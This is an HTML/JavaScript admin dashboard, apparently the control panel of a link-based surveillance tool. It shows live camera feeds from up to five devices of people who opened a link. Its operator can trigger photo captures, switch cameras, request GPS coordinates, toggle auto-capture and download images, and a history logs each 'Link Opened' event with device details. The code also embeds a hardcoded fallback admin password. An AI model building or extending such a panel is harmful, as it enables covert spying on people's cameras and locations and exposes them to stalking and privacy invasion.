<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard - CCTV Mode</title>
<style>
* { box-sizing: border-box; }
body { margin: 0; padding: 20px; background: #121212; color: #eee; font-family: Arial, sans-serif; }
.container { max-width: 1300px; margin: auto; }
h1, h2 { color: white; }
.panel { background: #1e1e1e; padding: 20px; margin-bottom: 20px; border-radius: 10px; }
.controls { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
button { border: 0; padding: 10px 15px; border-radius: 6px; cursor: pointer; background: #3498db; color: white; }
button:hover { opacity: 0.9; }
button:disabled { opacity: 0.5; cursor: not-allowed; }
button.danger { background: #e74c3c; }
button.success { background: #27ae60; }
button.switch { background: #8e44ad; }
button.gray { background: #555; }
.status { font-weight: bold; }
.users { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
.user-card { background: #292929; padding: 15px; border-radius: 8px; display: flex; flex-direction: column; gap: 10px; border: 1px solid #444; }
.user-info { font-size: 13px; }
.cctv-feed { width: 100%; height: 180px; background: #000; border-radius: 6px; object-fit: cover; display: block; }
.user-actions { display: flex; gap: 5px; flex-wrap: wrap; margin-top: 5px; }
.photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
.photo { background: #292929; padding: 10px; border-radius: 8px; }
.photo img { width: 100%; border-radius: 6px; display: block; margin-bottom: 8px; }
.history { max-height: 400px; overflow-y: auto; }
.history-item { padding: 10px; margin-bottom: 8px; background: #292929; border-radius: 6px; font-size: 13px; }
.login { min-height: 100vh; display: flex; justify-content: center; align-items: center; }
.login-box { width: 90%; max-width: 400px; background: #1e1e1e; padding: 25px; border-radius: 10px; }
input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #555; background: #111; color: white; }
.hidden { display: none !important; }
</style>
</head>
<body>

<div id="loginPage" class="login">
    <div class="login-box">
        <h2>Admin Login</h2>
        <input id="password" type="password" placeholder="Admin Password">
        <button onclick="login()" style="width:100%;">Login</button>
        <p id="loginError" style="color:#e74c3c;"></p>
    </div>
</div>

<div id="dashboard" class="container hidden">
    <h1>Admin Dashboard (CCTV Live View)</h1>
    
    <div class="panel">
        <h2>Controls</h2>
        <div class="controls">
            <button id="linkButton" onclick="toggleLink()">Disable Link</button>
            <button id="autoButton" onclick="toggleAutoCapture()">Auto Capture: ON</button>
            <button class="gray" onclick="logout()">Logout</button>
            <span id="linkStatus" class="status">Status: Loading...</span>
        </div>
    </div>

    <div class="panel">
        <h2>Active Users CCTV Feeds</h2>
        <p id="userCount">0 / 5</p>
        <div id="usersList" class="users">Waiting for users...</div>
    </div>

    <div class="panel">
        <h2>Temporary Captured Photos</h2>
        <div id="photoGrid" class="photo-grid">No photos.</div>
    </div>

    <div class="panel">
        <h2>Link Access History</h2>
        <div id="history" class="history">Loading history...</div>
    </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
let socket = null;
let isLinkActive = true;
let isAutoCapture = true;
let maxUsers = 5;
let currentPassword = "";

async function login() {
    const password = document.getElementById("password").value;
    const response = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password })
    });
    const data = await response.json();
    if (!data.ok) {
        document.getElementById("loginError").textContent = data.error || "Login failed.";
        return;
    }
    currentPassword = password;
    showDashboard();
}

async function checkLogin() {
    const response = await fetch("/api/admin/status");
    const data = await response.json();
    if (data.authenticated) showDashboard();
    else showLogin();
}

function showLogin() {
    document.getElementById("loginPage").classList.remove("hidden");
    document.getElementById("dashboard").classList.add("hidden");
}

function showDashboard() {
    document.getElementById("loginPage").classList.add("hidden");
    document.getElementById("dashboard").classList.remove("hidden");
    connectSocket();
}

function connectSocket() {
    if (socket) return;
    socket = io();

    socket.on("connect", () => { 
        socket.emit("admin-auth", currentPassword || "ayaz;;"); 
    });
    
    socket.on("admin-auth-required", () => { showLogin(); });
    
    socket.on("admin-initial-state", state => {
        isLinkActive = state.linkActive;
        isAutoCapture = state.autoCapture;
        maxUsers = state.maxUsers;
        updateLinkUI();
        updateAutoUI();
        renderUsers(state.users);
        renderHistory(state.history);
        renderPhotos(state.photos);
    });

    socket.on("update-users-list", users => { renderUsers(users); });
    socket.on("link-status", status => { isLinkActive = status; updateLinkUI(); });
    socket.on("auto-capture-status", status => { isAutoCapture = status; updateAutoUI(); });
    socket.on("access-event", event => { addHistoryEvent(event); });
    
    socket.on("update-live-stream", data => {
        const img = document.getElementById(`cctv-${data.socketId}`);
        if (img) {
            img.src = data.frameData;
            img.style.display = "block";
        }
    });

    socket.on("new-photo", photo => { addPhoto(photo); });
    socket.on("photo-deleted", photoId => {
        const element = document.getElementById(`photo-${photoId}`);
        if (element) element.remove();
    });
}

function renderUsers(users) {
    const container = document.getElementById("usersList");
    const ids = Object.keys(users);
    document.getElementById("userCount").textContent = `${ids.length} / ${maxUsers}`;

    if (ids.length === 0) {
        container.innerHTML = "No active users.";
        return;
    }

    // Keep existing cards or recreate cleanly
    container.innerHTML = "";

    ids.forEach(id => {
        const user = users[id];
        const card = document.createElement("div");
        card.className = "user-card";
        card.id = `user-card-${id}`;

        let locationText = "Location: Fetching...";
        if (user.location) {
            locationText = `Lat: ${user.location.latitude}, Lng: ${user.location.longitude}`;
        }

        card.innerHTML = `
            <img id="cctv-${id}" class="cctv-feed" style="display:none;" alt="Live Feed">
            <div class="user-info">
                <strong>${escapeHtml(user.deviceInfo)}</strong><br>
                <small>ID: ${escapeHtml(id.substring(0, 8))}</small><br>
                <small style="color: #2ecc71;">📍 ${escapeHtml(locationText)}</small>
            </div>
            <div class="user-actions">
                <button onclick="captureUser('${id}')">Capture</button>
                <button class="success" onclick="requestLoc('${id}')">Location</button>
                <button class="switch" onclick="switchCam('${id}')">Switch Cam</button>
            </div>
        `;
        container.appendChild(card);
    });
}

function captureUser(id) { socket.emit("admin-trigger-capture", id); }
function requestLoc(id) { socket.emit("admin-request-location", id); }
function switchCam(id) { socket.emit("admin-switch-camera", id); }

async function toggleLink() {
    const newStatus = !isLinkActive;
    await fetch("/api/admin/link", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ active: newStatus })
    });
}

async function toggleAutoCapture() {
    const newStatus = !isAutoCapture;
    await fetch("/api/admin/auto-capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ enabled: newStatus })
    });
}

function updateLinkUI() {
    const button = document.getElementById("linkButton");
    const status = document.getElementById("linkStatus");
    if (isLinkActive) {
        button.textContent = "Disable Link";
        button.className = "";
        status.textContent = "Status: Active";
        status.style.color = "#27ae60";
    } else {
        button.textContent = "Enable Link";
        button.className = "danger";
        status.textContent = "Status: Disabled";
        status.style.color = "#e74c3c";
    }
}

function updateAutoUI() {
    const button = document.getElementById("autoButton");
    button.textContent = `Auto Capture: ${isAutoCapture ? "ON" : "OFF"}`;
}

function renderPhotos(photos) {
    const grid = document.getElementById("photoGrid");
    grid.innerHTML = "";
    if (!photos.length) {
        grid.textContent = "No photos.";
        return;
    }
    photos.forEach(photo => addPhoto(photo, false));
}

function addPhoto(photo, prepend = true) {
    const grid = document.getElementById("photoGrid");
    if (grid.textContent.trim() === "No photos.") grid.innerHTML = "";

    const card = document.createElement("div");
    card.className = "photo";
    card.id = `photo-${photo.id}`;

    const image = document.createElement("img");
    image.src = photo.imageData;
    image.alt = "Captured image";

    const download = document.createElement("a");
    download.href = `/api/admin/photos/${encodeURIComponent(photo.id)}/download`;
    download.textContent = "Download";
    download.style.display = "inline-block";
    download.style.marginRight = "8px";
    download.style.color = "#3498db";

    const deleteButton = document.createElement("button");
    deleteButton.textContent = "Delete";
    deleteButton.className = "danger";
    deleteButton.onclick = () => deletePhoto(photo.id);

    card.appendChild(image);
    card.appendChild(download);
    card.appendChild(deleteButton);

    if (prepend) grid.prepend(card);
    else grid.appendChild(card);
}

async function deletePhoto(id) {
    if (!confirm("Delete this photo?")) return;
    await fetch(`/api/admin/photos/${encodeURIComponent(id)}`, { method: "DELETE" });
}

function renderHistory(history) {
    const container = document.getElementById("history");
    container.innerHTML = "";
    if (!history.length) {
        container.textContent = "No history.";
        return;
    }
    history.forEach(event => addHistoryEvent(event, false));
}

function addHistoryEvent(event, prepend = true) {
    const container = document.getElementById("history");
    if (container.textContent.trim() === "No history.") container.innerHTML = "";

    const item = document.createElement("div");
    item.className = "history-item";
    const type = event.event === "link-opened" ? "🔗 Link Opened" : "❌ Link Closed";

    item.innerHTML = `
        <strong>${type}</strong><br>
        Device: ${escapeHtml(event.deviceInfo || "Unknown")}<br>
        Session: ${escapeHtml((event.socketId || "").substring(0, 8))}<br>
        Time: ${escapeHtml(event.time || "")}
    `;

    if (prepend) container.prepend(item);
    else container.appendChild(item);
}

function escapeHtml(value) {
    return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

async function logout() {
    await fetch("/api/admin/logout", { method: "POST" });
    currentPassword = "";
    if (socket) { socket.disconnect(); socket = null; }
    showLogin();
}

checkLogin();
</script>
</body>
</html>
